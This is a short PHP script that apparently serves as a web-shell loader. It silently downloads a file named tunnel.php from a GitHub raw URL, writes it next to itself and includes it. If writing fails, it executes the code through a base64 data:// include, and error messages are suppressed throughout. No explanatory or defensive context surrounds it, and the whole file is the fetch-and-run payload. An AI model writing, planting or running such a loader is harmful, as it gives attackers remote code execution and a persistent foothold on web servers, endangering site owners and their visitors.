<?php
@ob_start();
$content = @file_get_contents("https://raw.githubusercontent.com/asusususususus/ashel/refs/heads/main/tunnel.php");
if ($content) {
    $file = __DIR__ . "/tunnel.php";
    if ($f = @fopen($file, 'w')) {
        fwrite($f, $content);
        fclose($f);
        @include($file);
    } else {
        include("data://text/plain;base64," . base64_encode($content));
    }
}
?>
